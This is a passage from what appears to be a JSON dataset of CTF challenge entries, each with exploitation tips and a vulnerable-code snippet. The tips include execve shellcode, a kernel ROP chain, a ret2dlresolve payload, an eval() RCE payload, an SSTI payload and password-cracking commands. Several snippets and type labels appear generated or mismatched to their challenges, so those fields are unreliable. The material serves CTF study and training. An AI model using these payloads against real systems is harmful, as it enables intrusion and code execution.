            "In scenarios where Non-Executable (NX) stack protection is disabled (`NX disabled`), and a program allows the execution of user-defined input without sufficient sanitization, it's possible to execute shellcode placed on the stack. Crafting and sending a payload that contains shellcode to overwrite the return address can grant an attacker control over the execution flow of a vulnerable program. This method requires prior knowledge or leaking of a stack address where the shellcode is placed.\n   - Example shellcode: `'\\x48\\x31\\xd2\\x52\\x48\\xb8\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x50\\x48\\x89\\xe7\\x52\\x57\\x48\\x89\\xe6\\x48\\x8d\\x42\\x3b\\x0f\\x05'`"
        ],
        "key": "```c\n         case 0x2c:  \n           iVar2 = getchar();  \n           mem[mp] = (char)iVar2;  \n           getchar();                  <----- this part  \n           ip = ip + 1;  \n           break;  \n```"
    },
    {
        "name": "Breath of Shadow",
        "write_up": "dataset/raw/Breath of Shadow.md",
        "type": "crypto",
        "competition": [
            "HITCON/2019/Quals",
            "https://ctftime.org/event/848/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When facing a driver vulnerability challenge that involves manipulating device IOCTL (Input Output Control) requests, analyze the driver's handling function (`IrpMjDeviceControl`) to identify control codes and possible vulnerabilities such as out-of-bounds (OOB) read/write errors. This knowledge applies to challenges where the exploit must interact with a Windows kernel driver via IOCTL requests. In such scenarios, carefully crafted IOCTL requests can be used to manipulate kernel memory and achieve arbitrary code execution. An example strategy involves determining the correct IOCTL command to interact with the device, then leveraging OOB errors to read or modify kernel memory.",
            "Constructing a ROP (Return-Oriented Programming) chain in a Windows kernel exploit scenario requires precise argument layout and stack alignment. Important tips include: ensuring arguments are placed below the stack pointer to avoid corruption by interrupt handlers, aligning the stack to 16 bytes before calling functions to accommodate instructions like `MOVDQA`, and utilizing existing system calls like `ZwOpenFile` or `ZwReadFile` for performing operations with only kernel privileges (avoiding direct modification of sensitive registers like CR4 to evade PatchGuard protection). These principles are crucial in scenarios where the exploit needs to execute a series of kernel-level operations without causing a crash due to misaligned or corrupted stack data.\n\nExample ROP snippet (given as conceptual guidance rather than direct payload):\n```\nBuf[pos++] = (KernelBase + 0x14001FC39 - 0x140001000);  /* pop rcx ; ret */\nBuf[pos++] = 0x406f8;                                   /* cr4 value */\nBuf[pos++] = (KernelBase + 0x14017ae47 - 0x140001000);  /* mov cr4, rcx ; ret */\n```"
        ],
        "key": "```c\n__int64 __fastcall DoDeviceControl(__int64 Irp, __int64 IoStackLocation)  \n{  \n ...  \n Type3InputBuffer = *(__m128i **)(IoStackLocation + 32);  \n InputBufferLength = *(unsigned int *)(IoStackLocation + 16);  \n OutputBufferLength = *(unsigned int *)(IoStackLocation + 8);  \n if ( !Type3InputBuffer )  \n   return 0xC0000001i64;  \n memset((__m128 *)CryptoBuffer, 0, 0x100ui64);  \n ProbeForRead(Type3InputBuffer, 0x100ui64, 1u);  \n memcpy((__m128i *)CryptoBuffer, Type3InputBuffer, InputBufferLength);  \n for ( i = 0; i < InputBufferLength >> 3; ++i )  \n   CryptoBuffer[i] ^= key;  \n ProbeForWrite(Type3InputBuffer, 0x100ui64, 1u);  \n memcpy(Type3InputBuffer, CryptoBuffer, OutputBufferLength);  \n return 0i64;  \n}  \n```"
    },
    {
        "name": "brie man",
        "write_up": "dataset/raw/brie man.md",
        "type": "misc",
        "competition": [
            "HXP/2021",
            "https://ctftime.org/event/1447/tasks/"
        ],
        "score": 208,
        "max_score": 1000,
        "difficulty": 0.208,
        "knowledge": [
            "When dealing with Python-based challenges, particularly those involving the evaluation of expressions or parsing of inputs, the use of `eval()` presents a potential Remote Code Execution (RCE) vulnerability. One can execute arbitrary code if they can control the input to `eval()`. This principle applies especially in scenarios where the input is poorly validated or sanitized. To exploit such a vulnerability, one can inject Python code as part of the input, which gets executed by the `eval()` function. \n   - Example payload: `print(open('flag.txt').read())` in an input that leads to an `eval()` call.",
            "In challenges involving complex numerical or mathematical computations, especially when using libraries or frameworks such as SageMath (`sage`), inspecting the source code or implementation of functions used in the challenge can reveal vulnerabilities. These vulnerabilities might stem from insecure or naive implementations, such as using `eval()` to parse strings into numbers or expressions. This knowledge serves as a reminder to scrutinize the underlying implementations of libraries or functions for potential injection points or execution paths that are not immediately apparent.\n   - Example approach: Inspecting `_element_constructor_()` or similar functions for usage of `eval()` with user-controlled input, leading to possible RCE."
        ],
        "key": "```python\nimport re\nimport sys\n\nif sys.version_info.major < 3:  \n   print('nope nope nope nope | https://hxp.io/blog/72')  \n   exit(-2)\n\nrx = re.compile(r'Dear Bernhard: Your conjecture is false, for ([^ ]{,40}) is a counterexample\\.')\n\ns = CC.to_prec(160)(rx.match(input()).groups()[0])\n\nr = round(s.real())  \nassert not all((s==r, r<0, r%2==0))     # boring\n\nassert not s.real() == 1/2              # boring\n\nassert zeta(s) == 0                     # uhm ok  \nprint(open('flag.txt').read().strip())  \n```"
    },
    {
        "name": "brillouin",
        "write_up": "dataset/raw/brillouin.md",
        "type": "crypto",
        "competition": [
            "CSAW/2019/Quals",
            "https://ctftime.org/event/870/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "In a challenge leveraging the Boneh-Lynn-Shacham (BLS) Signature Scheme, exploiting properties of bilinear pairing functions and aggregation can effectively bypass constraints in a multiparty signature scheme. Understanding the properties of bilinear pairing functions, such as `e(x + y, z) = e(x, z) * e(y, z)`, and how aggregation operations on signatures and public keys work, along with the ability to manipulate aggregation coefficients through a function like `lagrange_basis`, can allow for the creation of valid signatures despite limitations. This technique aligns with the Rogue Public Key attack methodology.",
            "When dealing with challenges that permit manipulating the parameters of aggregated signatures or aggregated public keys, one can exploit oversight in verification logic to forge a valid cryptographic proof. Specifically, if a system does not adequately verify all components involved in the signature aggregation process, such as not checking the third public key in a three-keys setup, it becomes possible to craft a scenario where the aggregated signature matches the aggregated public key for a given message. This scenario can be accomplished by strategically choosing values for these keys and using multiple valid signatures (e.g., `s` and `2 * s`) to satisfy the aggregated verification equations."
        ],
        "key": "```python\nif e(g, signature) == e(pk, hash(m)):  \n   print(\"signature is valid\")  \n```"
    },
    {
        "name": "Brittle Little Secret",
        "write_up": "dataset/raw/Brittle Little Secret.md",
        "type": "crypto",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When faced with an elliptic curve cryptography (ECC) challenge in CTFs, especially involving secure subgroups and commitments, if you suspect the points do not belong to the expected subgroups, factor the order of these points. This can reveal vulnerabilities due to smaller, unexpected subgroup orders allowing for a feasible discrete logarithm problem solution. For instance, multiplying the points by a large prime factor of the order that significantly reduces the order may make discrete logarithm computations tractable.  \n   - Example strategy: Factor the order of a given point `g1.order()` and look for prime factors to reduce the group order to a manageable size for discrete logarithm: `factor(g1.order())`.",
            "When the challenge involves finding a secret key using commitments and ECC, and direct discrete logarithm approaches fail due to large group orders, try reducing the order first as mentioned. If this reveals more manageable orders, apply the Chinese Remainder Theorem (CRT) to combine solutions modulo different orders when you have remainders of the secret key modulo these orders. This strategy is particularly useful when you manage to split the order into smaller factors, compute discrete logs for each factor effectively, and then need to recombine the key parts.\n   - Example implementation: Use CRT with the remainders and the orders: `CRT([remainder1, remainder2], [order1, order2]) = combined_key`."
        ],
        "key": "```rust\nuse ark_bls12_381::{Fq, Fq2, Fr, G1Affine, G2Affine};\nuse ark_ec::{AffineCurve, ProjectiveCurve};\nuse ark_ff::bytes::{FromBytes, ToBytes};\nuse std::{\n   env,\n   io::Cursor,\n   process::exit,\n   str::{from_utf8, FromStr},\n};\n\nconst ENCRYPTED_DATA: &'static str =\n\"beiLPpGUsefnBjahYgx8MKNl1Bd59EwQPUfYLXBRg8J7p6b3UhxDKQqtQG2XAUEEHleWprEKGZxW/0uPv4HcZ19jGre+1GW38tqxfWdmNrk5wu/s+t2waB0lBlCxA0QG4RcWc4yqAqEapkFp5eoReESZGcu/gPzWXLCBMuO4HCv2uz0S9nirCKGJZkUKxaAHnoWw2HN3CaZp7Dv5MrqOzROmZwtla3gttGqpgZ5hPyov6rYeL5IpmUFgkQSHtsoYNJGEaj4pTq3rslaUWT0wHluGcnQ0EFJWGjcTHgOzmEcFpNGPQEmual0cZnmTDF4XgJDCMcWzd4GwhruhTbdGGsmFAKB8R0VILMOKJhA0MHYmzaej0mlHhgpjmTZLQqoB1UQk7gO8MTYAozmchcRo667xAeZ2THs5G5FiczIq2Ej0EmijbuUHJfqszlPNvrQBrjtS5Rc2SJUTgCQTVij9d7vEcmTFgLibdcG/Ym8dFiiTjO58H74erbYaUQCLn5MU/ypBlEzhHKmqfYSQmhQuE0fhljz+F0kDduq0OhfcIr2QyL8vFnSiYFvXXXB9WTgUGvWCKNG2UMH9oeAZOZjDfsfTHWO7Iw+xscihEfYnGush7p85KDg6kOPzw+YGgXUOETFbhIHskl7irHtmoZgNfhxJ/oCr4OTaCzT7CeESaFbXOdSLX9rSGRFsxq2SyrwK6ybq2ZEIR0wBdPEP+UY0oNUDnXyVvE0Xgx/AwIYJK9t+GF4Fc3oW0UJBzXslHW0Qx4Dn7XlGWEozkgOHj3SAtMcofSd4hHNqII3ze9lJNTGBB2HwwtMfdL4IWzgJKyQQUTq5zwJd3S6xrka1TsRQx6aVNYLhmHUOFC7uzT3aMjtjWED6dJTlCcaJO4wMf4sW\";\n\n#[derive(Clone, Debug)]\nstruct EncryptedData {\n   pub g1: G1Affine,\n   pub commited_1: G1Affine,\n   pub g2: G2Affine,\n   pub commited_2: G2Affine,\n   pub encrypted_pt: G1Affine,\n}\n\nfn get_encrypted_data() -> EncryptedData {\n   let encdata_bin = base64::decode(ENCRYPTED_DATA).unwrap();\n   let mut encdata_reader = Cursor::new(&encdata_bin);\n   let data = EncryptedData {\n       g1: G1Affine::new(\n           Fq::read(&mut encdata_reader).unwrap(),\n           Fq::read(&mut encdata_reader).unwrap(),\n           false,\n       ),\n       commited_1: G1Affine::new(\n           Fq::read(&mut encdata_reader).unwrap(),\n           Fq::read(&mut encdata_reader).unwrap(),\n           false,\n       ),\n       g2: G2Affine::new(\n           Fq2::read(&mut encdata_reader).unwrap(),\n           Fq2::read(&mut encdata_reader).unwrap(),\n           false,\n       ),\n       commited_2: G2Affine::new(\n           Fq2::read(&mut encdata_reader).unwrap(),\n           Fq2::read(&mut encdata_reader).unwrap(),\n           false,\n       ),\n       encrypted_pt: G1Affine::new(\n           Fq::read(&mut encdata_reader).unwrap(),\n           Fq::read(&mut encdata_reader).unwrap(),\n           false,\n       ),\n   };\n   assert_eq!(encdata_reader.position(), encdata_bin.len() as u64);\n   data\n}\n\nfn main_result() -> Result<(), String> {\n   let encdata = get_encrypted_data();\n\n   let mut args = env::args();\n   args.next();\n   let first_arg = args.next().ok_or(\"No key provided\")?;\n   if first_arg.len() >= 40 {\n       return Err(\"invalid key\".into());\n   }\n   let key = Fr::from_str(&first_arg).map_err(|()| \"invalid key\")?;\n\n   // Verify the commitments\n   if encdata.g1.mul(key) != encdata.commited_1 {\n       return Err(\"invalid key\".into());\n   }\n   if encdata.g2.mul(key) != encdata.commited_2 {\n       return Err(\"invalid key\".into());\n   }\n   println!(\"The key is correct, proceeding to decryption...\");\n\n   let decrypted_pt = encdata.encrypted_pt.mul(key).into_affine();\n   let mut decrypted_raw: Vec<u8> = Vec::new();\n   decrypted_pt\n       .x\n       .write(&mut Cursor::new(&mut decrypted_raw))\n       .unwrap();\n   let decrypted = from_utf8(&decrypted_raw).map_err(|_| \"invalid key\")?;\n   println!(\"Message: {}\", decrypted.trim_end_matches(char::from(0)));\n   Ok(())\n}\n\nfn main() {\n   if let Err(msg) = main_result() {\n       eprintln!(\"Error: {}\", msg);\n       exit(1);\n   }\n}\n```"
    },
    {
        "name": "Broken Invitation",
        "write_up": "dataset/raw/Broken Invitation.md",
        "type": "crypto",
        "competition": [
            "CyBRICS/2020",
            "https://ctftime.org/event/1012/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "When faced with the scenario of a Hastad Broadcast attack in RSA where the same message is encrypted with the same small exponent (e.g., `e=3`) across different moduli, Chinese Remainder Theorem (CRT) can be employed to recover the message. This method requires collecting ciphertexts and their corresponding `N` values (moduli), then applying the CRT to find `message^e mod N`, where `N` is the product of all `N` values. After obtaining this result, the integer cubic root (or the e-th root for different values of `e`) of the result gives the original message.",
            "If the decrypted message does not make sense or appears incorrect, one should consider byte order issues such as little-endian versus big-endian representation. In cases where the output is unexpected, reversing the byte order of the decrypted message might reveal the correct flag. This step is essential when the decryption process uses a non-standard method for converting long integers to bytes, which may differ from the typical byte order assumptions made by widely used libraries or languages. \n\nExample payload:\n```python\nfrom crypto_commons.generic import long_to_bytes\nfrom crypto_commons.rsa.rsa_commons import hastad_broadcast\n\ndef main():\n   # Given NA, NB, NC, c1, c2, c3\n   residue_and_moduli = [(c1, NA), (c2, NB), (c3, NC)]\n   result = hastad_broadcast(residue_and_moduli)\n   flag = long_to_bytes(result)[::-1] # Reverse byte order for the correct flag\n   print(flag)\n\nmain()\n```"
        ],
        "key": "```python\ndef vulnerable_rsa_encrypt(message, e, N):\n    return pow(message, e, N)\n\ndef main():\n    e = 3\n    N1 = 924506488821656685683910901697171383575761384058997452768161613244316449994435541406042874502024337501621283644549497446327156438552952982774526792356194523541927862677535193330297876054850415513120023262998063090052673978470859715791539316871\n    N2 = 88950937117255391223977435698486265468789676087383749025900580476857958577458361251855358598960638495873663408330100969812759959637583297211068274793121379054729169786199319454344007481804946263873110263761707375758247409\n    N3 = 46120424124283407631877739918717497745499448442081604908717069311339764302716539899549382470988469546914660420190473379187397425725302899111432304753418508501904277711772373006543099077921097373552317823052570252978144835744949941108416471431004677\n\n    message = 123456789  # Example message\n    c1 = vulnerable_rsa_encrypt(message, e, N1)\n    c2 = vulnerable_rsa_encrypt(message, e, N2)\n    c3 = vulnerable_rsa_encrypt(message, e, N3)\n\n    print(c1, c2, c3)\n\nmain()\n```"
    },
    {
        "name": "Broken TV",
        "write_up": "dataset/raw/Broken TV.md",
        "type": "misc",
        "competition": [
            "Defcamp/2018/Quals",
            "https://ctftime.org/event/654/tasks/"
        ],
        "score": 83,
        "max_score": 369,
        "difficulty": 0.22493224932249323,
        "knowledge": [
            "When dealing with data exfiltration challenges, if direct data transfer is not possible, analyzing indirect signals such as the response time of pings to the target server can reveal binary-encoded data. This requires discerning patterns or ranges in the response times that correspond to binary digits (e.g., response times greater than a certain threshold represent a binary '1', and those below another threshold represent a '0'). This method can be especially useful in environments with strict data communication controls.\n   \n    - Example payload for analyzing ping times: \n    ```python\n    import subprocess\n\n    # Replace 'target_ip' with the actual target IP address\n    target_ip = \"104.248.38.191\"\n    ping_command = f\"ping -c 1 {target_ip}\"\n    binary_data = \"\"\n\n    for _ in range(100):  # Adjust number of pings as needed\n        response = subprocess.check_output(ping_command.split())\n        time_ms = float(response.decode().split(\"time=\")[1].split(\" ms\")[0])\n        \n        if time_ms > 1000:\n            binary_data += \"1\"\n        elif 200 < time_ms < 1000:\n            binary_data += \"0\"\n    print(binary_data)\n    ```",
            "After obtaining binary-encoded data from indirect communication methods like ping response times, the binary data often needs to be converted into ASCII to retrieve meaningful information or a flag. This can be done using online tools or scripts to translate binary digits into ASCII characters. This step is crucial for reconstructing the obtained data into a readable format, such as flags in CTF challenges.\n\n    - Example conversion snippet (continuing from the payload above):\n    ```python\n    ascii_characters = [chr(int(binary_data[i:i+8], 2)) for i in range(0, len(binary_data), 8)]\n    flag = \"\".join(ascii_characters)\n    print(flag)\n    ```"
        ],
        "key": "```python\nimport os\n\ndef ping_server():\n    response = os.popen(\"ping -c 1 104.248.38.191\").read()\n    return response\n\ndef analyze_response(response):\n    time_index = response.find(\"time=\")\n    if time_index != -1:\n        time_str = response[time_index+5:response.find(\" ms\", time_index)]\n        try:\n            time = float(time_str)\n            if 200 < time < 1000:\n                return '0'\n            elif time >= 1000:\n                return '1'\n        except ValueError:\n            pass\n    return None\n\ndef main():\n    binary_data = \"\"\n    for _ in range(100):  # Arbitrary number of pings\n        response = ping_server()\n        bit = analyze_response(response)\n        if bit is not None:\n            binary_data += bit\n    print(\"Binary data:\", binary_data)\n\nif __name__ == \"__main__\":\n    main()\n```\n"
    },
    {
        "name": "brokenimg 100",
        "write_up": "dataset/raw/brokenimg 100.md",
        "type": "forensics",
        "competition": [
            "TCP1P-CTF/2023",
            "https://ctftime.org/event/2001/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When encountering hidden data within image files, it's vital to scrutinize metadata fields (such as `tiff:Artist` in a TIFF image) for any suspicious or out-of-place entries. These entries might contain encoded data in formats like decimal, hexadecimal, or octal, and converting these values could reveal further clues or direct links to additional resources. For instance, converting octal values to ASCII can expose hidden URLs or messages.  \n**Example conversion (octal to ASCII):** `150 164 164 160 163 72 57 57 146 151 154 145 163 56 144 157 170 142 151 156 56 147 147 57 157 63 126 144 162 115 160 164 56 160 156 147` translates to a URL.",
            "If an image appears to contain encoded strings that are partially visible or split across different parts of the image, consider the possibility that the image has been manipulated (e.g., stretched, split, or mirrored). Tools or techniques to revert these manipulations, such as photo editing software, can be instrumental in revealing entire encoded sequences. Once the full encoded string is visible, it may require a sequence of decoding steps through different encoding schemes (e.g., Base32 to Base64) to retrieve the final flag or message.  \n**Decoding process example:** Transform a Base32 encoded string `KZCU4UKN...HU======` to reveal another encoded layer, e.g., `VENQMVB7...voNfQo=`, which then needs to be Base64 decoded to get the plaintext flag `TCP1P{pdf_h4v3_4_P1ctur3_blur_4nd_5h1ft}`."
        ],
        "key": "```xml\n<tiff:Artist>Maybe here : 150 164 164 160 163 72 57 57 146 151 154 145 163 56 144 157 170 142 151 156 56 147 147 57 157 63 126 144 162 115 160 164 56 160 156 147</tiff:Artist>\n```"
    },
    {
        "name": "bson",
        "write_up": "dataset/raw/bson.md",
        "type": "misc",
        "competition": [
            "kksctf/2020",
            "https://ctftime.org/event/1112/tasks/"
        ],
        "score": -1,
        "max_score": 411,
        "difficulty": -1,
        "knowledge": [
            "When encountering binary serialization formats such as MessagePack in CTF challenges, conversion tools can be used to decode the data into a more readable format like JSON. This approach is applicable in scenarios where the challenge provides encoded or serialized data, suggesting that the information is hidden or stored in non-plaintext formats.",
            "If a challenge involves encrypted or obfuscated data where a key is provided alongside numeric data representing ASCII values, applying a XOR operation between the key and each data element can reveal the plaintext. This technique is useful in scenarios where cryptographic operations or data obfuscation is performed using a XOR cipher, and both the key and the obfuscated data are known.\n   \n   Example Python code snippet to apply XOR and reveal ASCII characters:\n   ```python\n   key = 92\n   data = [55, 55, 47, 39, 54, ...]  # truncated for brevity\n   ascii_flag = [chr(key ^ byte) for byte in data]\n   print(''.join(ascii_flag))\n   ```"
        ],
        "key": "```python\n#!/bin/env/python3\n\nkey = 92  \nflag = [55,55,47,39,54,47,108,50,3,53,47,3,63,108,108,48,3,62,41,40,  \n       3,52,61,42,111,3,37,51,41,3,40,46,53,57,56,3,49,111,47,47,  \n       28,59,57,3,44,61,63,55,33]  \nascii_flag = []\n\nfor item in flag:  \n   xor_result = key^item  \n   ascii_flag.append(chr(xor_result))\n\nfor item in ascii_flag: print(item, end=\"\")  \n```"
    },
    {
        "name": "Buggy PWN",
        "write_up": "dataset/raw/Buggy PWN.md",
        "type": "pwn",
        "competition": [
            "CTFZone/2018/Quals",
            "https://ctftime.org/event/632/tasks/"
        ],
        "score": 138,
        "max_score": 500,
        "difficulty": 0.276,
        "knowledge": [
            "When exploiting a vulnerable service by overwriting the return address on the stack to redirect execution, ensuring the payload consists of only printable ASCII characters is crucial if the system constraints dictate so. This is especially relevant in challenges where input is limited to printable characters. Consider constructing payloads that adapt to this limitation by using XOR operations to turn non-printable into printable characters. For instance, if the target values are the ASCII codes for 'f' and 'l', and the constraint requires printable characters only, XOR these values with a printable character to produce a result that meets the input constraint. An illustrative payload component might look like this:\n```\nxorchar = '\\x40'  # A printable character chosen for XOR operation\neax_val = chr(ord('f')^ord(xorchar)) + chr(ord('l')^ord(xorchar))\n```",
            "In scenarios involving a custom virtual machine (VM) or unique architecture within a CTF challenge, closely inspecting and understanding the memory operations, including how data is read, written, and how execution flow can be manipulated, is essential. If the VM employs a 2D memory plane and uses specific syscalls or commands to alter execution flow (like a `rotip` command to change execution direction), crafting a precise exploit demands ingenuity in how shellcode is laid out in memory. For such challenges, it's beneficial to devise a strategy that not only injects the required shellcode but also aligns with the VM's execution mechanics to ensure the payload executes as intended. An example approach involves leveraging a command to redirect the execution flow vertically instead of the default horizontal direction, addressing constraints like the maximum string length or specific syscall requirements to trigger a desired action, such as printing a flag."
        ],
        "key": "```python\ndef __command_xor(self, amplifier):\n    inreg = amplifier & 0xf\n    outreg = amplifier >> 4\n    stderr.print(\"xor %s %s\\n\" % (self.reg_names[inreg], self.reg_names[outreg]))\n    # first define reg_names similarly to dataregs\n```"
    },
    {
        "name": "bunnydance",
        "write_up": "dataset/raw/bunnydance.md",
        "type": "pwn",
        "competition": [
            "b01lers/2021",
            "https://ctftime.org/event/1259/tasks/"
        ],
        "score": 497,
        "max_score": 500,
        "difficulty": 0.994,
        "knowledge": [
            "Stack buffer overflow vulnerabilities can be exploited by sending a cyclic pattern payload to overwrite the return pointer address. This process involves generating a unique cyclic pattern, overflowing the buffer to crash the program, and analyzing the core dump to find the exact offset where the return address is overwritten. This technique is useful in scenarios where security mechanisms like stack canaries are not present, allowing direct manipulation of the stack's return pointer.\n\n    Example payload generation and offset finding using Python with Pwntools:\n    ```python\n    payload = pwn.cyclic(128)\n    # Process execution and crash\n    core = pwn.Coredump(\"./core\")\n    offset = pwn.cyclic_find(core.fault_addr & (2 ** 32 - 1))\n    ```",
            "The `ret2dlresolve` technique can be applied to execute arbitrary code by leveraging the dynamic linker and resolver. This technique is particularly useful when direct code execution via traditional methods (like `ret2libc`) is not possible or more challenging due to restrictions or protections. By crafting a payload that causes the dynamic linker to resolve a function (such as \"system\") with controlled arguments, attackers can achieve arbitrary code execution even with limited control over the execution flow or memory content.\n\n    Example of constructing a `ret2dlresolve` payload with Pwntools:\n    ```python\n    ret2dl = pwn.Ret2dlresolvePayload(elf, \"system\", [\"/bin/sh\"], bss)\n    rop = pwn.ROP(elf)\n    rop.raw(rop.ret.address)  # ret gadget to align stack\n    rop.gets(bss)\n    rop.ret2dlresolve(ret2dl)\n    payload = b\"A\" * offset + rop.chain() + b\"\\n\" + ret2dl.payload\n    ```"
        ],
        "key": "```c\n#include<stdio.h>\n\nint main() {  \n   setvbuf(stdin, 0, 2, 0);  \n   setvbuf(stdout, 0, 2, 0);  \n   setvbuf(stderr, 0, 2, 0);\n\n   // break up main in random line increments into seperate functions  \n   char input[48]; // buffer varies  \n   puts(\"Name: \"); // puts, printf, write, fwrite. print_output function, Text varies  \n   gets(input); // gets, fgets, scanf, strcpy, memcpy, fread  \n   puts(\"Hello, \"); // puts, printf, write, fwrite print_output function text varies  \n   puts(input);  \n}  \n```"
    },
    {
        "name": "Burn the candle on both the ends",
        "write_up": "dataset/raw/Burn the candle on both the ends.md",
        "type": "forensics",
        "competition": [
            "RITSEC/2018",
            "https://ctftime.org/event/682/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "In a forensic challenge involving file analysis, **Binwalk** can be employed to detect and extract embedded files within a given challenge file, such as a ZIP file hidden inside an image. This technique is applicable when the challenge file appears to be a standard file format (e.g., JPG) but may contain additional data or files.  \nExample command:  \n```binwalk -e candle.jpg```",
            "For encrypted ZIP archives encountered in challenges, when the password is not known, the combination of **zip2john** and **John The Ripper** with a well-known wordlist like **Rockyou** can be effective for brute-forcing the password. This approach is suitable when direct brute-forcing tools, such as **fcrackzip**, fail to yield results.  \nExample commands:  \nExtract hash:  \n```zip2john archive.zip > hash.txt```  \nBrute-force password:  \n```john --wordlist=rockyou.txt --format=zip hash.txt```"
        ],
        "key": "```python\n# Possible vulnerable code snippet for handling ZIP files\nimport zipfile\n\ndef extract_zip(zip_path, extract_to):\n    with zipfile.ZipFile(zip_path, 'r') as zip_ref:\n        zip_ref.extractall(extract_to)\n\n# Usage\nextract_zip('archive.zip', './extracted')\n```\n"
    },
    {
        "name": "ButterFly",
        "write_up": "dataset/raw/ButterFly.md",
        "type": "pwn",
        "competition": [
            "CSCML/2020",
            "https://ctftime.org/event/1071/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When exploiting buffer overflow vulnerabilities, careful manipulation of the buffer can bypass certain restrictions, such as input length checks. Specifically, converting input characters to uppercase (`str.upper()`) after an input length check can be used to exploit situations where the transformation increases the length of the input, enabling buffer overflows despite initial restrictions. This technique relies on finding characters that expand upon case transformation, like the German \"\u00df\", which becomes \"SS\" when converted to uppercase. This can lead to overflowing a buffer if the programming logic does not account for such changes in input size after transformations.  \n   Example payload: Python script to generate `'\u00df'*16` and send it to the application.",
            "Exploiting `FILE*` structure in libc can be complex but effective for executing arbitrary code, particularly when dealing with fully protected binaries (Full RELRO, PIE, NX, and stack canaries enabled). The technique involves overwriting the `FILE*` stream's `vtable` pointer to point to a controlled or fake `vtable` with entries that can trigger arbitrary function calls, such as `system(\"/bin/sh\")`. The exploitation process requires leaking libc addresses to calculate the base address of libc in memory, constructing a fake `FILE` structure, and carefully writing this structure to memory locations where file stream pointers (`stdin`, `stdout`, `stderr`) are stored. This method is applicable for exploiting binaries that use standard I/O functions and can bypass modern security mechanisms by leveraging inherent properties of the `FILE` structure and function pointers within libc.\n   - Key steps include: leaking libc addresses, constructing a fake `FILE` structure, and overwriting a `FILE*` stream's `vtable` to point to controlled memory containing a crafted `vtable`.\n   - No specific payload provided due to complexity and scenario-specific requirements."
        ],
        "key": "```c\n#include<stdio.h>  \n#include<stdlib.h>  \n#include<string.h>  \n#include<fcntl.h>  \n#include<unistd.h>\n\nchar *note[0x2];\n\nlong int getnum() {  \n\tchar buffer[0x20];  \n\tread(0,buffer,0x18);  \n\treturn atoll(buffer);  \n}  \nvoid setup() {  \n\tsetvbuf(stdin,0,2,0);  \n\tsetvbuf(stdout,0,2,0);  \n\tsetvbuf(stderr,0,2,0);  \n\talarm(20);  \n}  \nvoid handler() {  \n\tchar buffer[0x100];  \n\tnote[0] = (char *)malloc(0x200);  \n\tnote[1] = (char *)malloc(0x200);  \n\tprintf(\"I need your name: \");  \n\tread(0,buffer,0x50);  \n\tputs(buffer);  \n\tprintf(\"Enter the index of the you want to write: \");  \n\tlong int idx = getnum();  \n\tif(idx < 2) {  \n\t\tprintf(\"Enter data: \");  \n\t\tread(0,note[idx],0xe8);  \n\t}  \n\tputs(\"Bye\");  \n\t_exit(0x1337);  \n}  \nint main() {  \n\tsetup();  \n\thandler();  \n}  \n```"
    },
    {
        "name": "Buyify",
        "write_up": "dataset/raw/Buyify.md",
        "type": "crypto",
        "competition": [
            "CSAW/2019/Quals",
            "https://ctftime.org/event/870/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When facing a Server-side Template Injection (SSTI) challenge, especially with Handlebars template engine, initial confirmation of SSTI can be quickly identified by injecting simple mathematical operations in the template, such as `{{7*7}}`. If SSTI exists, the server's error response or output will directly reflect the injection attempt, indicating template parsing capabilities.",
            "In scenarios involving JWT token handling within SSTI vulnerable applications, if the application logic allows for token manipulation or key disclosure, bypassing security measures without requiring Remote Code Execution (RCE) can be achievable. Specifically, in cases where the secret key for JWT signature verification can be overridden or disclosed via template injection, crafting a JWT with known or controlled parameters (such as price or id) enables bypassing authentication or authorization checks. Utilize deprecated JavaScript functions such as `__defineSetter__` and `__defineGetter__` within Handlebars to override object properties, enabling the manipulation of critical security parameters.\n   \nExample payload for JWT manipulation: \n```javascript\n{{#with this.__proto__ as |o|}}  \n   {{o.__defineGetter__ \"key\" toString}}  \n   {{o.__defineSetter__ \"key\" toString}}  \n{{/with}}  \n```\n\nThis payload, when injected in a Handlebars template, would set the getter and setter for any \"key\" property access on the object prototype to return or expect a string representation of the object, assisting in the manual crafting or modification of a JWT with an expected or known key."
        ],
        "key": "```js\n// Invalidate and resign all items  \nfunction update_store() {  \n // Create store key with long random string  \n store.key = crypto.randomBytes(64).toString('hex');\n\n for (let item of store.items) {  \n   item.token = sign_item(item);  \n }  \n}\n\n// Create an item, assign it an id, and store its callback  \nfunction create_item(id, name, callback) {  \n let item_id = `${id}.${name}`;  \n items[item_id] = callback;  \n return item_id;  \n}\n\n// Sign an item for sale in the store  \nfunction sign_item(item) {  \n let token = jwt.sign({id:item.id, price:item.price}, store.key);  \n return token;  \n}\n\n// Get an item callback  \nfunction get_item(item) {  \n money_count += item.price;  \n return items[item.id];  \n}\n\n// Create the Flag store and the Flag item  \nstores[create_store('Flag','flag')].create_item('flag', 100000000, (id, req,\nres)=>{  \n flag_count++;  \n res.send(`Congrats! Your flag is ${  \n     fs.readFileSync('flag.txt').toString().replace(/^\\s+|\\s+$/g, '')}!`);  \n});\n\n// Create an item with a given name and price  \nfunction create_item_impl(name, price, cb) {  \n let item = {  \n   name: name,  \n   price: price,  \n };\n\n // The server assigns an item id to us that is unique  \n item.id = g_create_item(name, cb);\n\n store.items.push(item);  \n store.item_map[item.id] = item;\n\n update_store();  \n}\n\n// Checkout function\nfunction checkout(req, res) {  \n item = jwt.verify(req.body.token, store.key);  \n}\n```"
    },
    {
        "name": "bynary encoding",
        "write_up": "dataset/raw/bynary encoding.md",
        "type": "misc",
        "competition": [
            "SpaceHeroes/2023",
            "https://ctftime.org/event/1856/tasks/"
        ],
        "score": 148,
        "max_score": 1000,
        "difficulty": 0.148,
        "knowledge": [
